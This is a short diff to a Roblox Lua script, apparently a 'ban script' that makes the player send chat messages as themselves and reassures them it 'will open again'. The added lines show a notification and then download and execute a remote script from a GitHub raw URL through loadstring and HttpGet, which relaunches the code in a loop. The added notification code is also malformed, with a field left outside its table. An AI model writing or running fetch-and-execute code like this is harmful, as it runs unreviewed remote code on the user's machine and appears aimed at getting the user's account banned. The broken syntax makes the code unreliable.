@@ -201,6 +201,15 @@ local A_2 = "All"
 local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
 Event:FireServer(A_1, A_2)
 
-print("Banned Account")
+		    game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "〰 Script Ended 〰";
+        Text = "〰 If you are not banned, Do Nothing, It Will Open Again 〰";
+        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+    Duration = 3;
 
-end
+print("Script Ended")
+print("If you are not banned, Do Nothing, It Will Open Again")
+
+wait(3)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OfflinePlayer01/Ban-Script/main/Script.lua", true))()
